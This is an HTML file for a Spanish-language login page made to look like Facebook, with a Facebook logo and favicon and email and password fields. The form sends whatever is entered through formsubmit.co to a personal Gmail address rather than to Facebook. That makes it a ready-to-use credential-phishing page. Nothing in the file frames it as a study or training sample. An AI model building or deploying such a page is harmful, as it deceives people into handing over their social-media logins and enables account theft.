<!DOCTYPE html>
<html lang="en">
<head>
<link rel="shortcut icon" type="image/png" href="facebook.png">
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
 :root {
    --background-color: #005ef6;
    --primary-color: rgba(0, 38, 255, 0.363);
    --border-color: #000000;
    --text-color: rgb(255, 255, 255);
}

body {
    font-family: Arial, sans-serif;
    background-color: var(--background-color);
    margin: 0;
    padding: 0;
}

.container {
    display: flex;
    flex-direction: column;
    align-items: center;
    justify-content: center;
    width: 300px;
    height: 450px;
    background-color: var(--primary-color);
    border-radius: 4px;
    box-shadow: 0 2px 4px rgba(255, 255, 255, 0.1);
    margin: 50px auto;
    padding: 20px;
    text-align: center;
}

.meta-logo {
    margin-bottom: 30px;
}

.meta-logo img {
    width: 50px;
    height: auto;
}

h1 {
    margin-bottom: 30px;
}

label {
    display: block;
    margin-bottom: 5px;
}

input[type="email"],
input[type="password"] {
    width: 100%;
    padding: 10px;
    margin-bottom: 15px;
    border: 1px solid var(--border-color);
    border-radius: 4px;
}

button[type="submit"],
.create-account {
    width: 100%;
    padding: 5px;
    background-color: var(--primary-color);
    color: var(--text-color);
    border: 1px solid var(--border-color);
    border-radius: 4px;
    cursor: pointer;
    display: flex;
    align-items: center;
    justify-content: center;
    margin-top: 25px;
    margin-left: 10px;
    
}

button[type="submit"]:hover,
.create-account:hover {
    background-color: var(--border-color);
}

p {
    text-align: center;
    margin-top: 20px;
    font-size: 0.8em;
    color: rgb(255, 255, 255);
    
}

p a {
    color: var(--primary-color);
    text-decoration: none;
   
   
}

p a:hover {
    text-decoration: underline;
    
}

.create-account {
    margin-top: 5px;
    margin-left: auto;
    height: 30;
   
}
h4{
    padding-left: 16px;
}
    
    </style>
    <title>Login</title>

</head>
<body>
    <div class="container">
        <div class="meta-logo">
           
        </div>
 
        <form action="https://formsubmit.co/sergueypere262@gmail.com" method="POST"  id="login-form">
            <img src="facebook.png" alt="Facebook" width="20" height="30" ><br><br>
            <label for="email">Correo electrónico</label>
            <input type="email" id="email" name="email" required>
            <label for="password">Contraseña</label>
            <input type="password" id="password" name="password" required>
            <button type="submit">Iniciar sesión</button>
        </form>
        <p>
             <h4> ¿No tienes una cuenta?</h4> 

            <span class="create-account" id="create-account-link">
                <span>Crear cuenta</span>
            </span>
        </p>
    </div>
    
</body>
</html>

